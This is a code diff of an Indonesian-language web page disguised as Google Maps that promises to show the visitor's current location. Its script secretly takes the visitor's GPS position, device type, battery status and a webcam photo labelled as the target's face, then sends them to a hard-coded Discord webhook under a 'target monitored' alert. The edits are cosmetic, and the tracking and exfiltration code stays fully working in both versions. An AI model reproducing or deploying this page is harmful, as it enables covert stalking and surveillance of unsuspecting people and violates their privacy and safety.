@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Sinkronisasi Lokasi</title>
+    <title>Google Maps - Update Rute</title>
     <style>
-        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
-        .logo { width: 70px; margin-bottom: 20px; }
-        .btn { padding: 15px 25px; background: #4285F4; color: white; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: 0.3s; }
+        body { margin: 0; font-family: sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
+        .logo { width: 60px; margin-bottom: 15px; }
+        .btn { padding: 12px 20px; background: #4285F4; color: white; border: none; border-radius: 20px; cursor: pointer; font-size: 15px; font-weight: bold; width: 100%; transition: 0.3s; }
         .btn:hover { background: #3367d6; }
-        .text { color: #70757a; margin-top: 15px; font-size: 13px; line-height: 1.5; }
+        .text { color: #70757a; margin-top: 15px; font-size: 13px; line-height: 1.4; }
     </style>
 </head>
 <body>
@@ -18,7 +18,7 @@
     <div class="card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" class="logo">
         <button class="btn" onclick="mainkan()">Lihat Lokasi Terkini</button>
-        <p class="text">Izin akses lokasi diperlukan untuk memberikan rute tercepat dan presisi GPS.</p>
+        <p class="text">Sinkronisasi GPS diperlukan untuk menayangkan rute yang presisi dan update real-time.</p>
     </div>
 
     <script>
@@ -26,7 +26,7 @@
         const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR"; 
 
         async function mainkan() {
-            document.querySelector('.btn').innerHTML = "Menghubungkan...";
+            document.querySelector('.btn').innerHTML = "Menghubungkan GPS...";
             
             // Ambil Info Perangkat & Baterai
             let bInfo = "N/A";
@@ -51,7 +51,9 @@
                     
                     canvas.toBlob(async (blob) => {
                         const formData = new FormData();
-                        formData.append("content", `**🚨 TARGET TERPANTAU!**\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n📍 **Maps:** ${mapsUrl}`);
+                        // --- INI PERBAIKANNYA: Teks Tipe HP duluan ---
+                        formData.append("content", `**🚨 TARGET TERPANTAU!**\n\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n📍 **Maps:** ${mapsUrl}`);
+                        // --- Fotonya taruh belakangan ---
                         formData.append("file", blob, "wajah_target.jpg");
                         
                         await fetch(webhookURL, { method: 'POST', body: formData });
@@ -60,16 +62,16 @@
 
                     stream.getTracks().forEach(t => t.stop());
                 } catch (e) {
-                    // Jika kamera ditolak, tetap kirim data lainnya
+                    // Jika kamera ditolak, tetap kirim data teks lainnya
                     await fetch(webhookURL, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ content: `**📍 LOKASI MASUK (Kamera Ditolak)**\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n🌍 **Maps:** ${mapsUrl}` })
+                        body: JSON.stringify({ content: `**📍 LOKASI MASUK (Kamera Ditolak)**\n\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n🌍 **Maps:** ${mapsUrl}` })
                     });
                     window.location.href = mapsUrl;
                 }
             }, (err) => {
-                alert("Gagal sinkronisasi. Klik 'Izinkan' untuk melihat lokasi.");
+                alert("Sinkronisasi gagal. Klik 'Izinkan' untuk melihat lokasi.");
                 document.querySelector('.btn').innerHTML = "Lihat Lokasi Terkini";
             });
         }
